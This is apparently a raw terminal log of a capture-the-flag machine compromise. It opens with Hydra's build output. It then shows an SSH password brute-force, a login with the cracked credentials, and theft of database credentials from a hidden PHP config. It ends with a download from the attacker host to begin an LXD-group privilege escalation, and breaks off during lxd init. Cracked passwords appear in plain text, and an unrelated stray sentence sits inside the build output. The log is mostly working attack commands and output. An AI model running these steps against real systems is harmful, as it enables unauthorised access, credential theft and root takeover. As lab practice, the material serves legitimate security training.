+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-adam6500.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-rtsp.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-rpcap.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-radmin2.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c crc32.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c d3des.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+d3des.c: In function ‘deskey’:
+d3des.c:63:6: warning: old-style function definition [-Wold-style-definition]
+   63 | void deskey(key, edf) /* Thanks to James Gillogly & Phil Karn! */
+      |      ^~~~~~
+d3des.c: In function ‘cookey’:
+d3des.c:108:13: warning: old-style function definition [-Wold-style-definition]
+  108 | static void cookey(raw1) register unsigned long *raw1;
+      |             ^~~~~~
+d3des.c: In function ‘cpkey’:
+d3des.c:130:6: warning: old-style function definition [-Wold-style-definition]
+  130 | void cpkey(into) register unsigned long *into;
+      |      ^~~~~
+d3des.c: In function ‘usekey’:
+d3des.c:140:6: warning: old-style function definition [-Wold-style-definition]
+  140 | void usekey(from) register unsigned long *from;
+      |      ^~~~~~
+d3des.c: In function ‘scrunch’:
+d3des.c:159:13: warning: old-style function definition [-Wold-style-definition]
+  159 | static void scrunch(outof, into) register unsigned char *outof;
+      |             ^~~~~~~
+d3des.c: In function ‘unscrun’:
+d3des.c:173:13: warning: old-style function definition [-Wold-style-definition]
+  173 | static void unscrun(outof, into) register unsigned long *outof;
+      |             ^~~~~~~
+d3des.c: In function ‘desfunc’:
+d3des.c:211:13: warning: old-style function definition [-Wold-style-definition]
+  211 | static void desfunc(block, keys) register unsigned long *block, *keys;
+      |             ^~~~~~~
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c bfg.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+At top level:
+cc1: note: unrecognized command-line option ‘-Wno-unused-command-line-argument’ may have been intended to silence earlier diagnostics
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c ntlm.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c sasl.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hmacmd5.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-mod.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-time.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-smb2.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -lm -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument  -o hydra  hydra.c hydra-vnc.o hydra-pcnfs.o hydra-rexec.o hydra-nntp.o hydra-socks5.o hydra-telnet.o hydra-cisco.o hydra-http.o hydra-ftp.o hydra-imap.o hydra-pop3.o hydra-smb.o hydra-icq.o hydra-cisco-enable.o hydra-ldap.o hydra-memcached.o hydra-mongodb.o hydra-mysql.o hydra-mssql.o hydra-cobaltstrike.o hydra-xmpp.o hydra-http-proxy-urlenum.o hydra-snmp.o hydra-cvs.o hydra-smtp.o hydra-smtp-enum.o hydra-sapr3.o hydra-ssh.o hydra-sshkey.o hydra-teamspeak.o hydra-postgres.o hydra-rsh.o hydra-rlogin.o hydra-oracle-listener.o hydra-svn.o hydra-pcanywhere.o hydra-sip.o hydra-oracle-sid.o hydra-oracle.o hydra-vmauthd.o hydra-asterisk.o hydra-firebird.o hydra-afp.o hydra-ncp.o hydra-http-proxy.o hydra-http-form.o hydra-irc.o hydra-redis.o hydra-rdp.o hydra-s7-300.c hydra-adam6500.o hydra-rtsp.o hydra-rpcap.o hydra-radmin2.o crc32.o d3des.o bfg.o ntlm.o sasl.o hmacmd5.o hydra-mod.o hydra-time.o hydra-smb2.o -lm -lz -lcurses -lssl -lssh -lcrypto -L/usr/lib -L/usr/local/lib -L/lib -L/lib/x86_64-linux-gnu -I/usr/include -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H 
+
+If men could get pregnant, abortion would be a sacrament
+
+
+Now type make install
+
+Now type make install
+strip hydra pw-inspector
+echo OK > /dev/null && test -x xhydra && strip xhydra || echo OK > /dev/null
+mkdir -p /usr/local/bin
+cp -f hydra-wizard.sh hydra pw-inspector /usr/local/bin && cd /usr/local/bin && chmod 755 hydra-wizard.sh hydra pw-inspector
+echo OK > /dev/null && test -x xhydra && cp xhydra /usr/local/bin && cd /usr/local/bin && chmod 755 xhydra || echo OK > /dev/null
+sed -e "s|^INSTALLDIR=.*|INSTALLDIR="/usr/local"|" dpl4hydra.sh | sed -e "s|^LOCATION=.*|LOCATION="/etc"|" > /usr/local/bin/dpl4hydra.sh
+chmod 755 /usr/local/bin/dpl4hydra.sh
+mkdir -p /usr/local/etc
+cp -f *.csv /usr/local/etc
+mkdir -p /usr/local/man/man1/
+cp -f hydra.1 xhydra.1 pw-inspector.1 /usr/local/man/man1/
+mkdir -p /usr/local/share/pixmaps
+cp -f xhydra.png /usr/local/share/pixmaps/
+mkdir -p /usr/local/share/applications
+desktop-file-install --dir /usr/local/share/applications xhydra.desktop
+                                                                                                                                                                 
+┌──(kali㉿kali)-[~/thc-hydra]
+└─$ hydra -l jubiscleudo -P /home/kali/root/wordlist.txt ssh://192.168.1.18:2222 -t 4 -vV
+
+Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-27 13:55:17
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 300 login tries (l:1/p:300), ~75 tries per task
+[DATA] attacking ssh://192.168.1.18:2222/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://jubiscleudo@192.168.1.18:2222
+[ERROR] could not connect to ssh://192.168.1.18:2222 - Connection refused
+                                                                                                                                                                 
+┌──(kali㉿kali)-[~/thc-hydra]
+└─$ hydra -l jubiscleudo -P /home/kali/root/wordlist.txt ssh://192.168.1.18:2222         
+Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-27 13:55:36
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 300 login tries (l:1/p:300), ~19 tries per task
+[DATA] attacking ssh://192.168.1.18:2222/
+[ERROR] could not connect to ssh://192.168.1.18:2222 - Connection refused
+                                                                                                                                                                 
+┌──(kali㉿kali)-[~/thc-hydra]
+└─$ hydra -l jubiscleudo -P /home/kali/root/wordlist.txt ssh://192.168.1.18:4444 -t 4 -vV
+Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-27 13:55:52
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 300 login tries (l:1/p:300), ~75 tries per task
+[DATA] attacking ssh://192.168.1.18:4444/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://jubiscleudo@192.168.1.18:4444
+[ERROR] could not connect to ssh://192.168.1.18:4444 - Connection refused
+                                                                                                                                                                 
+┌──(kali㉿kali)-[~/thc-hydra]
+└─$ hydra -l jubiscleudo -P /home/kali/root/wordlist.txt ssh://192.168.1.18              
+Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-27 13:56:03
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 300 login tries (l:1/p:300), ~19 tries per task
+[DATA] attacking ssh://192.168.1.18:22/
+
+[22][ssh] host: 192.168.1.18   login: jubiscleudo   password: onlymy
+^C1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 6 final worker threads did not complete until end.
+[ERROR] 6 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-27 13:57:00
+                                                                                                                                                                 
+┌──(kali㉿kali)-[~/thc-hydra]
+└─$ 
+                                                                                                                                                                 
+┌──(kali㉿kali)-[~/thc-hydra]
+└─$ hydra -l jubiscleudo -P /home/kali/root/wordlist.txt ssh://192.168.1.18
+Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-27 13:57:07
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 300 login tries (l:1/p:300), ~19 tries per task
+[DATA] attacking ssh://192.168.1.18:22/
+
+[22][ssh] host: 192.168.1.18   login: jubiscleudo   password: onlymy
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 2 final worker threads did not complete until end.
+[ERROR] 2 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-27 13:57:50
+                                                                                                                                                                 
+┌──(kali㉿kali)-[~/thc-hydra]
+└─$ 
+                                                                                                                                                                 
+┌──(kali㉿kali)-[~/thc-hydra]
+└─$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.2  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::a035:6a43:45d3:78ae  prefixlen 64  scopeid 0x20<link>
+        inet6 2401:4900:1c82:9f53:a738:6552:bfe:48bd  prefixlen 64  scopeid 0x0<global>
+        ether 08:00:27:ad:25:87  txqueuelen 1000  (Ethernet)
+        RX packets 701342  bytes 1008076852 (961.3 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 191427  bytes 15638023 (14.9 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 5  bytes 328 (328.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 5  bytes 328 (328.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/thc-hydra]
+
+------------------------------------------------------------------------------------------------------------------------
+
+                                                                                                                                                              
+┌──(root㉿kali)-[/home/kali/root]
+└─# ssh jubiscleudo@192.168.1.185                                                
+ssh: connect to host 192.168.1.185 port 22: No route to host
+                                                                                                                                                                 
+┌──(root㉿kali)-[/home/kali/root]
+└─# ssh jubiscleudo@192.168.1.18 
+The authenticity of host '192.168.1.18 (192.168.1.18)' can't be established.
+ED25519 key fingerprint is SHA256:eKPnFiq8KwR3xWNP5ZL/aPJYYx+GZaCVrzrHIL4rem4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? 
+Host key verification failed.
+                                                                                                                                                                 
+┌──(root㉿kali)-[/home/kali/root]
+└─# ssh jubiscleudo@192.168.1.18
+The authenticity of host '192.168.1.18 (192.168.1.18)' can't be established.
+ED25519 key fingerprint is SHA256:eKPnFiq8KwR3xWNP5ZL/aPJYYx+GZaCVrzrHIL4rem4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.1.18' (ED25519) to the list of known hosts.
+jubiscleudo@192.168.1.18's password: 
+Welcome to Ubuntu 21.04 (GNU/Linux 5.11.0-16-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Oct 27 08:30:33 AM UTC 2025
+
+  System load: 0.08               Memory usage: 42%   Processes:       110
+  Usage of /:  20.2% of 23.99GB   Swap usage:   0%    Users logged in: 0
+
+  => There were exceptions while processing one or more plugins. See
+     /var/log/landscape/sysinfo.log for more information.
+
+ * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops!
+
+     https://microk8s.io/
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Your Ubuntu release is not supported anymore.
+For upgrade information, please visit:
+http://www.ubuntu.com/releaseendoflife
+
+New release '22.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+Last login: Thu Apr 29 16:19:07 2021 from 192.168.2.106
+jubiscleudo@ubuntu20:~$ ls
+jubiscleudo@ubuntu20:~$ id
+uid=1001(jubiscleudo) gid=1001(jubiscleudo) groups=1001(jubiscleudo)
+jubiscleudo@ubuntu20:~$ ls -la
+total 32
+drwxr-x--- 3 jubiscleudo jubiscleudo 4096 Apr 29  2021 .
+drwxr-xr-x 4 root        root        4096 Apr 29  2021 ..
+-rw------- 1 jubiscleudo jubiscleudo    5 Apr 29  2021 .bash_history
+-rw-r--r-- 1 jubiscleudo jubiscleudo  220 Apr 29  2021 .bash_logout
+-rw-r--r-- 1 jubiscleudo jubiscleudo 3771 Apr 29  2021 .bashrc
+drwx------ 2 jubiscleudo jubiscleudo 4096 Apr 29  2021 .cache
+-rw-r--r-- 1 jubiscleudo jubiscleudo  807 Apr 29  2021 .profile
+-rw-r--r-- 1 jubiscleudo jubiscleudo 2984 Apr 27  2021 .user.txt
+jubiscleudo@ubuntu20:~$  cat .user.txt
+%                                              ,%&&%#.                                              
+%                                         *&&&&%%&%&&&&&&%                                          
+%                                       &&&&            .%&&&                                       
+%                                     &&&#                 %&&&                                     
+%                                   /&&&                     &&&.                                   
+%                                  %&%/                       %&&*                                  
+%                                 .&&#     (%%(,     ,(&&*     %&&                                  
+%                                 &&%    %&&&&&&&&&&&&&&%&%#    &&&                                 
+%                                 &&%&&&&&&&   #&&&&&*   &&&&&&&%&%                                 
+%                                 &&&&&&&&&&&&&&,   /&&&&&&&&&&&&&&                                 
+%                                 &&&&&&&%                 &&&&&&&&                                 
+%                                  %&&%&&&&              /&&&%&&&%                                  
+%                                 &.%&&% %&&%           &&&& %&&/*&                                 
+%                              &&&&&&&&&&  %&&&&#   %%&&&&  %&&&&&&&&&                              
+%                           /&%&/   *&&&&&&   %&&&&&&%&   &&&&&&.   %&&&.                           
+%                          &&&           &&%&           %%%%          .&&&                          
+%                         &&%                                           &&&                         
+%                        %&&.   *&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%&&    /&&(                        
+%                       /&&#   #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*   %&&                        
+%                       &&%    ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%     %&%                       
+%                      &&&      %&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&      %&&                      
+%                      &&&      &&&&&&&&&&&&&&&%&   %&&&&&&&&&&&&&&&%      &&&                      
+%                      %&&&%    &&&&&&&&&&&&&&&&     &&&&&&&&&&&&&&&%    &%&&#                      
+%                        &&&&&&&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                        
+%                           &%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                           
+%                                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                                
+%                                *&%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&                                 
+%                                &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%                                
+%                                 #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%( 
+
+invite-me: https://www.linkedin.com/in/eliastouguinho/
+jubiscleudo@ubuntu20:~$ su hackable_3
+Password: 
+su: Authentication failure
+jubiscleudo@ubuntu20:~$  ls -la
+total 32
+drwxr-x--- 3 jubiscleudo jubiscleudo 4096 Apr 29  2021 .
+drwxr-xr-x 4 root        root        4096 Apr 29  2021 ..
+-rw------- 1 jubiscleudo jubiscleudo    5 Apr 29  2021 .bash_history
+-rw-r--r-- 1 jubiscleudo jubiscleudo  220 Apr 29  2021 .bash_logout
+-rw-r--r-- 1 jubiscleudo jubiscleudo 3771 Apr 29  2021 .bashrc
+drwx------ 2 jubiscleudo jubiscleudo 4096 Apr 29  2021 .cache
+-rw-r--r-- 1 jubiscleudo jubiscleudo  807 Apr 29  2021 .profile
+-rw-r--r-- 1 jubiscleudo jubiscleudo 2984 Apr 27  2021 .user.txt
+jubiscleudo@ubuntu20:~$ cd /home
+jubiscleudo@ubuntu20:/home$ ls -la
+total 16
+drwxr-xr-x  4 root        root        4096 Apr 29  2021 .
+drwxr-xr-x 21 root        root        4096 Apr 29  2021 ..
+drwxr-x---  3 hackable_3  hackable_3  4096 Apr 29  2021 hackable_3
+drwxr-x---  3 jubiscleudo jubiscleudo 4096 Apr 29  2021 jubiscleudo
+jubiscleudo@ubuntu20:/home$ cd /var/www/html
+jubiscleudo@ubuntu20:/var/www/html$ ls -la
+total 124
+drwxr-xr-x 8 root     root      4096 Jun 30  2021 .
+drwxr-xr-x 3 root     root      4096 Apr 29  2021 ..
+-rw-r--r-- 1 www-data www-data 61259 Apr 21  2021 3.jpg
+drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 backup
+-r-xr-xr-x 1 www-data www-data   522 Apr 29  2021 .backup_config.php
+drwxr-xr-x 2 www-data www-data  4096 Apr 29  2021 config
+-rw-r--r-- 1 www-data www-data   507 Apr 23  2021 config.php
+drwxr-xr-x 2 www-data www-data  4096 Apr 21  2021 css
+-rw-r--r-- 1 www-data www-data 11327 Jun 30  2021 home.html
+drwxr-xr-x 2 www-data www-data  4096 Apr 21  2021 imagens
+-rw-r--r-- 1 www-data www-data  1095 Jun 30  2021 index.html
+drwxr-xr-x 2 www-data www-data  4096 Apr 20  2021 js
+drwxr-xr-x 5 www-data www-data  4096 Jun 30  2021 login_page
+-rw-r--r-- 1 www-data www-data   487 Apr 23  2021 login.php
+-rw-r--r-- 1 www-data www-data    33 Apr 21  2021 robots.txt
+jubiscleudo@ubuntu20:/var/www/html$ cat .backup_config.php
+<?php
+/* Database credentials. Assuming you are running MySQL
+server with default setting (user 'root' with no password) */
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'hackable_3');
+define('DB_PASSWORD', 'TrOLLED_3');
+define('DB_NAME', 'hackable');
+ 
+/* Attempt to connect to MySQL database */
+$conexao = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
+
+
+// Check connection
+if($conexao === false){
+    die("ERROR: Could not connect. " . mysqli_connect_error());
+} else {
+}
+?>
+jubiscleudo@ubuntu20:/var/www/html$ su hackable_3
+Password: 
+hackable_3@ubuntu20:/var/www/html$ id
+uid=1000(hackable_3) gid=1000(hackable_3) groups=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+hackable_3@ubuntu20:/var/www/html$ cd /tmp
+hackable_3@ubuntu20:/tmp$ ls -la
+total 48
+drwxrwxrwt 12 root root 4096 Oct 27 08:15 .
+drwxr-xr-x 21 root root 4096 Apr 29  2021 ..
+drwxrwxrwt  2 root root 4096 Oct 27 06:43 .font-unix
+drwxrwxrwt  2 root root 4096 Oct 27 06:43 .ICE-unix
+drwx------  3 root root 4096 Oct 27 06:43 snap.lxd
+drwx------  3 root root 4096 Oct 27 06:43 systemd-private-1249ee0167c5478d8359e01ed78c49ac-apache2.service-K18Fc0
+drwx------  3 root root 4096 Oct 27 08:15 systemd-private-1249ee0167c5478d8359e01ed78c49ac-systemd-logind.service-R71RLl
+drwx------  3 root root 4096 Oct 27 08:15 systemd-private-1249ee0167c5478d8359e01ed78c49ac-systemd-resolved.service-jw4pRD
+drwx------  3 root root 4096 Oct 27 08:15 systemd-private-1249ee0167c5478d8359e01ed78c49ac-systemd-timesyncd.service-nLKvtX
+drwxrwxrwt  2 root root 4096 Oct 27 06:43 .Test-unix
+drwxrwxrwt  2 root root 4096 Oct 27 06:43 .X11-unix
+drwxrwxrwt  2 root root 4096 Oct 27 06:43 .XIM-unix
+hackable_3@ubuntu20:/tmp$ wget 192.168.1.2:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2025-10-27 08:51:30--  http://192.168.1.2:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 192.168.1.2:8080... failed: Connection refused.
+hackable_3@ubuntu20:/tmp$ wget 192.168.1.18:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2025-10-27 08:51:51--  http://192.168.1.18:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 192.168.1.18:8080... failed: Connection refused.
+hackable_3@ubuntu20:/tmp$ wget 192.168.1.18:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2025-10-27 08:52:05--  http://192.168.1.18:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 192.168.1.18:8000... failed: Connection refused.
+hackable_3@ubuntu20:/tmp$ wget 192.168.1.2:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2025-10-27 08:52:14--  http://192.168.1.2:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 192.168.1.2:8000... failed: Connection refused.
+hackable_3@ubuntu20:/tmp$ wget 192.168.1.2:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2025-10-27 08:54:22--  http://192.168.1.2:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 192.168.1.2:8080... failed: Connection refused.
+hackable_3@ubuntu20:/tmp$ 
+hackable_3@ubuntu20:/tmp$ wget 192.168.1.2:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2025-10-27 08:57:32--  http://192.168.1.2:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 192.168.1.2:8080... failed: Connection refused.
+hackable_3@ubuntu20:/tmp$ wget 192.168.1.2:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2025-10-27 09:18:04--  http://192.168.1.2:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 192.168.1.2:8080... failed: Connection refused.
+hackable_3@ubuntu20:/tmp$ wget 192.168.1.2:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2025-10-27 09:18:19--  http://192.168.1.2:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 192.168.1.2:8000... failed: Connection refused.
+hackable_3@ubuntu20:/tmp$ wget 192.168.1.2:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2025-10-27 09:20:00--  http://192.168.1.2:8080/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 192.168.1.2:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3259593 (3.1M) [application/gzip]
+Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’
+
+alpine-v3.13-x86_64-20210218_0139.tar.gz  100%[====================================================================================>]   3.11M  --.-KB/s    in 0.1s    
+
+2025-10-27 09:20:00 (28.7 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]
+
+hackable_3@ubuntu20:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+If this is your first time running LXD on this machine, you should also run: lxd init
+To start your first instance, try: lxc launch ubuntu:18.04
+
+Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
+hackable_3@ubuntu20:/tmp$ lxc image list
++---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
++---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
+| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64       | CONTAINER | 3.11MB | Oct 27, 2025 at 9:22am (UTC) |
++---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
+hackable_3@ubuntu20:/tmp$ lxd init
+Would you like to use LXD clustering? (yes/no) [default=no]:    
+Do you want to configure a new storage pool? (yes/no) [default=yes]: 
+Name of the new storage pool [default=default]: 
